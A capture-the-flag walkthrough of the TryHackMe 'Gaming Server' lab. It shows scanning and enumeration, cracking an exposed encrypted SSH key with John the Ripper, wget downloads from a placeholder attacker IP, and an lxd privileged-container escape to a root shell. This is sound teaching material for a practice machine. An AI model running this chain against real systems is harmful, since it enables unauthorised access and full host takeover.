---

Name: Gaming Server
Difficulty: Easy
URL: https://tryhackme.com/room/gamingserver

---

# Solution
First we take a look at the open ports on the server
```bash
rustscan -a gaming.thm -r 1-65535 --ulimit 5000 -- -sC -sV
```
```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Inspecting the page source we find an HTML comment, which reveals that john might be an username for SSH or some other service
```HTML
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Now let's enumerate the directories and files
```bash
gobuster dir -u http://gaming.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log -k
```
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gaming.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,log,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
about.php            (Status: 200) [Size: 2213]
about.html           (Status: 200) [Size: 1435]
index.html           (Status: 200) [Size: 2762]
index.html           (Status: 200) [Size: 2762]
robots.txt           (Status: 200) [Size: 33]
robots.txt           (Status: 200) [Size: 33]
secret               (Status: 301) [Size: 309] [--> http://gaming.thm/secret/]
server-status        (Status: 403) [Size: 275]
uploads              (Status: 301) [Size: 310] [--> http://gaming.thm/uploads/]
Progress: 33257 / 33257 (100.00%)
```

We find /secret which has one RSA key
```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

/uploads has multiple files
- dict.lst: looks like a password list
- meme.jpg: a meme
- manifesto.txt: a message from a hacker


The encrypted RSA private key cannot be used directly because it is protected with a passphrase. Fortunately, the dict.lst file found in /uploads appears to be a custom wordlist, making it a good candidate for a dictionary attack against the key

John the Ripper cannot crack SSH private keys directly, so we first convert the key into a hash format that it understands using ssh2john.py
```bash
ssh2john.py id_rsa > id_rsa.hash
```

Now we crack the passphrase
```bash
john id_rsa.hash --wordlist=dict.lst
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:00 DONE (2026-07-22 12:30) 50.00g/s 11100p/s 11100c/s 11100C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password is letmein and we can connect with SSH now
```bash
ssh -i id_rsa john@gaming.thm
```

And read the user flag
```bash
cat user.txt
```

Running id shows that the john user belongs to the lxd group. Members of this group can manage LXD containers, which can be abused to create a privileged container and mount the host filesystem, effectively leading to root privileges

Since the target does not have Internet access, we download a compatible Alpine LXD image on our attack machine and transfer it to the target using a temporary HTTP server. We can get them from [here](https://images.linuxcontainers.org/images/alpine/3.22/amd64/default/20260719_13%3A00/), the files we will need are:
```bash
incus.tar.xz
rootfs.squashfs
```

Let's host the files
```bash
python3 -m http.server
```

> [!NOTE]
> Fedora's firewall blocks inbound connections on port 8000 by default. If you're hosting the image with python3 -m http.server, temporarily allow the port:
> sudo firewall-cmd --add-port=8000/tcp
> sudo firewall-cmd --runtime-to-permanent
>
> Remove the rule after finishing:
> sudo firewall-cmd --remove-port=8000/tcp --permanent
> sudo firewall-cmd --reload

Now we get them on the server
```bash
cd /tmp

wget http://YOUR_IP:8000/incus.tar.xz
wget http://YOUR_IP:8000/rootfs.squashfs
```

After transferring the image, we import it into the local LXD image store so that it can be used to create a new container
```bash
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
```

We now create a privileged container and mount the host's root filesystem inside it. Because the container is privileged, we can access the host filesystem with root privileges
```bash
lxc image list

lxc init alpine privesc -c security.privileged=true

lxc config device add privesc hostroot disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/sh
```

Once inside the container, the host filesystem is mounted under /mnt/root. By changing our root directory to the mounted filesystem with chroot, we obtain a root shell on the host
```bash
chroot /mnt/root /bin/bash
```

We can finally read root.txt
```bash
root@privesc:/# cat /root/root.txt
REDACTED
```
